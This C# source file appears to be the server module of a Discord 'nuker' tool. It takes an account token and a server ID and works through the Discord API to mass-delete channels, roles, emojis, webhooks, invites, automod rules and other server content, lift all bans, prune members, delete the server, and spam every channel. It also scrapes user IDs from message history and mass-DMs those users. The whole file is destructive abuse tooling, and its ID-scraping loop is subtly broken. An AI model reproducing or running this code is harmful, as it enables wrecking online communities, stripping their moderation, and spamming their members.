﻿using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Linq;
using Console = Colorful.Console;
using System.Drawing;

namespace nuker
{
    public class Server
    {
        public static void MsgInEveryChannel(string token, ulong? gid, string message)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    if (entry.type == "0")
                    {
                        Request.Send($"/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
                    }
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void LeaveDeleteGuild(string token, ulong? gid, string owner)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                if (owner == "y")
                {
                    Request.Send($"/guilds/{gid}", "DELETE", token);
                }
                else if (owner == "n")
                {
                    Request.Send($"/users/@me/guilds/{gid}", "DELETE", token);
                }
                else
                {
                    try
                    {
                        Request.Send($"/guilds/{gid}", "DELETE", token);
                    } catch { }
                    try
                    {
                        Request.Send($"/users/@me/guilds/{gid}", "DELETE", token);
                    } catch { }
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ServerInformation(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}", token);
                var id = JObject.Parse(request)["id"];
                var ownerid = JObject.Parse(request)["owner_id"];
                var region = JObject.Parse(request)["region"];
                var vanityurl = JObject.Parse(request)["vanity_url_code"];
                var iconid = JObject.Parse(request)["icon"].ToString();
                var bannerid = JObject.Parse(request)["banner"].ToString();
                string icon;
                if (string.IsNullOrEmpty(iconid))
                {
                    icon = "N/A";
                }
                else
                {
                    icon = $"https://cdn.discordapp.com/icons/{id}/{iconid}.webp";
                }
                string banner;
                if (string.IsNullOrEmpty(bannerid))
                {
                    banner = "N/A";
                }
                else
                {
                    banner = $"https://cdn.discordapp.com/banners/{id}/{bannerid}.webp?size=240";
                }
                var verificationlevel = JObject.Parse(request)["verification_level"].ToString();
                if (verificationlevel == "0")
                {
                    verificationlevel = "None";
                }
                else if (verificationlevel == "1")
                {
                    verificationlevel = "Low";
                }
                else if (verificationlevel == "2")
                {
                    verificationlevel = "Medium";
                }
                else if (verificationlevel == "3")
                {
                    verificationlevel = "High";
                }
                else if (verificationlevel == "4")
                {
                    verificationlevel = "Highest";
                }
                var preferredlocale = JObject.Parse(request)["preferred_locale"];
                var nsfw = JObject.Parse(request)["nsfw"].ToString();
                var roles = Request.SendGet($"/guilds/{gid}/roles", token);
                var array = JArray.Parse(roles);
                int rolescount = 0;
                foreach (dynamic entry in array)
                {
                    rolescount++;
                }
                var channels = Request.SendGet($"/guilds/{gid}/channels", token);
                var array2 = JArray.Parse(channels);
                int channelscount = 0;
                foreach (dynamic entry in array2)
                {
                    channelscount++;
                }
                var emojis = Request.SendGet($"/guilds/{gid}/emojis", token);
                var array3 = JArray.Parse(emojis);
                int emojiscount = 0;
                foreach (dynamic entry in array3)
                {
                    emojiscount++;
                }
                var stickers = Request.SendGet($"/guilds/{gid}/stickers", token);
                var array4 = JArray.Parse(stickers);
                int stickerscount = 0;
                foreach (dynamic entry in array4)
                {
                    stickerscount++;
                }
                var bans = Request.SendGet($"/guilds/{gid}/bans", token);
                var array5 = JArray.Parse(bans);
                int banscount = 0;
                foreach (dynamic entry in array5)
                {
                    banscount++;
                }
                var invites = Request.SendGet($"/guilds/{gid}/invites", token);
                var array6 = JArray.Parse(invites);
                int invitescount = 0;
                foreach (dynamic entry in array6)
                {
                    invitescount++;
                }

                Console.ForegroundColor = Color.Yellow;
                Console.WriteLine("Server Information:\n");
                Console.WriteLine($"Owner ID: {ownerid}\nRegion: {region}\nRoles Count: {rolescount}\nChannels Count: {channelscount}\nEmojis Count: {emojiscount}\nStickers Count: {stickerscount}\nBans Count: {banscount}\nInvites Count: {invitescount}\nVerification Level: {verificationlevel}\nPreferred Locale: {preferredlocale}\nNSFW: {nsfw}\nVanity Code: {vanityurl}\nServer Icon: {icon}\nBanner: {banner}");
                Console.WriteLine("\nPress any key to go back.");
                Console.ReadKey();
                Console.Clear();
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void CreateChannel(string token, ulong? gid, string name)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"/guilds/{gid}/channels", "POST", token, $"{{\"name\":\"{name}\"}}");
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void CreateRole(string token, ulong? gid, string name)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"/guilds/{gid}/roles", "POST", token, $"{{\"name\":\"{name}\"}}");
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteInvites(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/invites", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/invites/{entry.code}", "DELETE", token);
                    Console.WriteLine($"Deleted: {entry.code}", Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteEmojis(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/emojis", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/emojis/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Deleted: {entry.name}", Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteChannels(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/channels/{entry.id}", "DELETE", token);
                    Console.WriteLine($"Deleted: {entry.name}", Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void RemoveBans(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/bans", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/bans/" + entry.user["id"], "DELETE", token);
                    Console.WriteLine("Removed: " + entry.user["username"] + "#" + entry.user["discriminator"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteRoles(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/roles", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/roles/" + entry["id"], "DELETE", token);
                    Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteStickers(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/stickers", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/stickers/" + entry["id"], "DELETE", token);
                    Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static string GetServerName(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                string request = Request.SendGet($"/guilds/{gid}", token);
                var name = JObject.Parse(request)["name"].ToString();
                return name;
            }
            catch { return "N/A"; }
        }

        public static void PruneMembers(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"/guilds/{gid}/prune", "POST", token, $"{{\"days\": 1}}");
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void RemoveIntegrations(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/integrations", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/integrations/" + entry["id"], "DELETE", token);
                    Console.WriteLine("Deleted: " + entry["name"], Color.Lime);

                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteAllReactions(string token, ulong? cid, ulong? mid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"/channels/{cid}/messages/{mid}/reactions", "DELETE", token);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void GetIDs(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                if (!File.Exists("ids.txt"))
                {
                    File.Create("ids.txt").Dispose();
                }
                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    string request2 = Request.SendGet($"/channels/{entry.id}/messages?limit=100", token);
                    var array2 = JArray.Parse(request2);
                    foreach (dynamic entry2 in array)
                    {
                        string id = entry2.author["id"];
                        if (!File.ReadAllLines("ids.txt").Contains(id))
                        {
                            File.AppendAllText("ids.txt", id + Environment.NewLine);
                        }
                    }
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void ServerDM(string token, string message)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                if (!File.Exists("dmed.txt"))
                {
                    File.Create("dmed.txt").Dispose();
                }
                string[] list = File.ReadAllLines("dmed.txt");
                foreach (var id in File.ReadAllLines("ids.txt"))
                {
                    Request.Send($"/users/@me/channels", "POST", token, $"{{\"recipient_id\":\"{id}\"}}");
                }
                var request = Request.SendGet($"/users/@me/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    string id = entry.id;
                    if (!File.ReadAllLines("dmed.txt").Contains(id))
                    {
                        Request.Send($"/channels/{entry.id}/messages", "POST", token, $"{{\"content\":\"{message}\"}}");
                        Console.WriteLine($"Messaged: {entry.recipients[0].username}#{entry.recipients[0].discriminator}", Color.Lime);
                        File.AppendAllText("dmed.txt", id + Environment.NewLine);
                    }
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteAutoModerationRules(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/auto-moderation/rules", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/auto-moderation/rules/" + entry["id"], "DELETE", token);
                    Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void CreateInvite(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/channels/{entry.id}/invites", "POST", token, $"{{\"max_age\": 0}}");
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteGuildScheduledEvents(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/scheduled-events", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/scheduled-events/{entry.id}", "DELETE", token);
                    Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteGuildTemplate(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/templates", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/guilds/{gid}/templates/{entry.code}", "DELETE", token);
                    Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteStageInstances(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/channels", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    if (entry.type == "13")
                    {
                        Request.Send($"/stage-instances/{entry.id}", "DELETE", token);
                        Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
                    }
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteWebhooks(string token, ulong? gid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                var request = Request.SendGet($"/guilds/{gid}/webhooks", token);
                var array = JArray.Parse(request);
                foreach (dynamic entry in array)
                {
                    Request.Send($"/webhooks/{entry.id}", "DELETE", token);
                    Console.WriteLine("Deleted: " + entry["name"], Color.Lime);
                }
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void DeleteWebhook(string token, ulong? wid)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"/webhooks/{wid}", "DELETE", token);
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }

        public static void SendWebhookMessage(string token, ulong? wid, string wtoken, string message)
        {
            Console.ReplaceAllColorsWithDefaults();
            try
            {
                Request.Send($"/webhooks/{wid}/{wtoken}", "POST", token, $"{{\"content\":\"{message}\"}}");
            }
            catch { Console.WriteLine("Failed", Color.Red); }
        }
    }
}
